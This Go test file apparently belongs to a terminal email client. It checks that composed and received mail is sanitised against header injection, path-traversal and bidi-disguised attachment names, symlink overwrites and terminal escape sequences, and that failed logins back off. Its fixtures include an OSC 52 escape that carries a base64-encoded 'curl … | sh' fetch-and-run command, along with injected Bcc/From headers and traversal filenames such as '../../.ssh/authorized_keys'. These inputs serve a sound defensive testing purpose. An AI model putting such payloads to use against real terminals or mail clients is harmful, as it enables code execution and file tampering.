package worker

import (
	"fmt"
	"github.com/emersion/go-imap/v2"
	"github.com/gausejakub/vimail/internal/auth"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestComposeRFC5322BlocksHeaderInjection(t *testing.T) {
	_, raw := ComposeRFC5322("me@example.com", "you@example.com\r\nBcc: evil@example.com",
		"Re: hi\r\nReply-To: attacker@evil.test\r\nFrom: ceo@corp.test", "body")
	head, _, _ := strings.Cut(string(raw), "\r\n\r\n")
	for _, line := range strings.Split(head, "\r\n") {
		name, _, _ := strings.Cut(line, ":")
		switch strings.ToLower(name) {
		case "from", "to", "subject", "date", "message-id", "mime-version", "content-type", "content-transfer-encoding":
		default:
			t.Fatalf("injected header line %q in:\n%s", line, head)
		}
	}
	if strings.Count("\r\n"+head, "\r\nFrom:") != 1 || strings.Contains("\r\n"+head, "\r\nBcc:") {
		t.Fatalf("header injected:\n%s", head)
	}
}

func TestComposeEncodesNonASCIISubject(t *testing.T) {
	_, raw := ComposeRFC5322("me@example.com", "you@example.com", "Příliš žluťoučký", "b")
	if !strings.Contains(string(raw), "Subject: =?utf-8?q?") {
		t.Fatalf("subject not RFC 2047 encoded:\n%s", raw)
	}
}

func TestRecipientAddresses(t *testing.T) {
	got := recipientAddresses(`a@x.test, "Bob" <b@y.test>`)
	if len(got) != 2 || got[0] != "a@x.test" || got[1] != "b@y.test" {
		t.Fatalf("recipients = %v", got)
	}
	if got := recipientAddresses("not an address"); len(got) != 1 {
		t.Fatalf("fallback = %v", got)
	}
}

func TestSafeFilename(t *testing.T) {
	cases := map[string]string{
		"../../.ssh/authorized_keys": "authorized_keys",
		`..\..\evil.exe`:             "evil.exe",
		"..":                         "attachment",
		".":                          "attachment",
		"":                           "attachment",
		"/etc/passwd":                "passwd",
		".bashrc":                    "bashrc",
		"inv\u202efdp.app":           "invfdp.app",
		"a\x1b[2J\x00b.pdf":          "ab.pdf",
		"report.pdf. ":               "report.pdf",
		"C:\\Users\\x\\a.txt":        "a.txt",
		"normal file (1).pdf":        "normal file (1).pdf",
	}
	for in, want := range cases {
		if got := safeFilename(in); got != want {
			t.Errorf("safeFilename(%q) = %q, want %q", in, got, want)
		}
	}
	if !isDangerousFilename(safeFilename("inv\u202efdp.app")) {
		t.Error("bidi-disguised .app not flagged as dangerous")
	}
}

func TestWriteNewFileNeverOverwritesOrFollowsSymlinks(t *testing.T) {
	dir := t.TempDir()
	victim := filepath.Join(dir, "victim")
	if err := os.WriteFile(victim, []byte("keep"), 0600); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(dir, "a.txt")
	if err := os.Symlink(victim, link); err != nil {
		t.Skip("symlinks unavailable")
	}
	got, err := writeNewFile(link, []byte("new"))
	if err != nil {
		t.Fatal(err)
	}
	if got == link || filepath.Base(got) != "a (1).txt" {
		t.Fatalf("wrote to %q, want a (1).txt", got)
	}
	if data, _ := os.ReadFile(victim); string(data) != "keep" {
		t.Fatalf("symlink target overwritten: %q", data)
	}
}

// A received message must not be able to smuggle terminal escape sequences
// into the cache through any header or body field.
func TestIngestStripsTerminalEscapes(t *testing.T) {
	osc52 := "\x1b]52;c;Y3VybCB4LmNvL2F8c2gK\x07"
	env := &imap.Envelope{
		Subject: "Invoice" + osc52,
		From:    []imap.Address{{Name: "Pay‮Pal" + osc52, Mailbox: "x", Host: "evil.test"}},
		To:      []imap.Address{{Name: "you\x1b[2J", Mailbox: "me", Host: "example.com"}},
	}
	msg := ParseEnvelope(7, env, nil)

	raw := "From: a@b.test\r\nSubject: s\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=B\r\n\r\n" +
		"--B\r\nContent-Type: text/plain\r\n\r\nhello" + osc52 + " world\x1b[?1049l\r\n" +
		"--B\r\nContent-Type: application/pdf\r\nContent-Disposition: attachment; filename=\"a\x1b[2J\x1b[31mb.pdf\"\r\n\r\nPDF\r\n--B--\r\n"
	body, err := ParseBody([]byte(raw))
	if err != nil {
		t.Fatal(err)
	}
	fields := map[string]string{"subject": msg.Subject, "from": msg.From, "to": msg.To, "body": body.Text}
	for _, att := range body.Attachments {
		fields["attachment"] = att.Filename
	}
	if _, ok := fields["attachment"]; !ok {
		t.Fatal("attachment not parsed")
	}
	for name, value := range fields {
		if strings.ContainsAny(value, "\x1b\x07‮\u009b") {
			t.Errorf("%s still carries control characters: %q", name, value)
		}
	}
	if msg.Subject != "Invoice" || !strings.Contains(body.Text, "hello world") {
		t.Errorf("visible text damaged: subject=%q body=%q", msg.Subject, body.Text)
	}
}

func TestRejectedLoginBacksOffAndResets(t *testing.T) {
	c := &Coordinator{creds: map[string]*auth.Credentials{"a@x.test": {}}, authFail: map[string]*authFailure{}}
	if err := c.authCooldownError("a@x.test"); err != nil {
		t.Fatalf("cooldown before any failure: %v", err)
	}
	// Network errors never start a cooldown.
	c.noteConnectResult("a@x.test", fmt.Errorf("IMAP connect to host: timeout"))
	if err := c.authCooldownError("a@x.test"); err != nil {
		t.Fatalf("network error started a cooldown: %v", err)
	}
	authErr := fmt.Errorf("IMAP auth for a@x.test: invalid credentials")
	c.noteConnectResult("a@x.test", authErr)
	first := c.authFail["a@x.test"].until
	if err := c.authCooldownError("a@x.test"); err == nil || !strings.Contains(err.Error(), "vimail setup") {
		t.Fatalf("no cooldown after rejected login: %v", err)
	}
	if _, cached := c.creds["a@x.test"]; cached {
		t.Fatal("rejected credentials still cached")
	}
	c.noteConnectResult("a@x.test", authErr)
	if !c.authFail["a@x.test"].until.After(first.Add(20 * time.Second)) {
		t.Fatal("cooldown did not grow on repeated failure")
	}
	c.noteConnectResult("a@x.test", nil)
	if err := c.authCooldownError("a@x.test"); err != nil {
		t.Fatalf("cooldown survived a successful login: %v", err)
	}
}
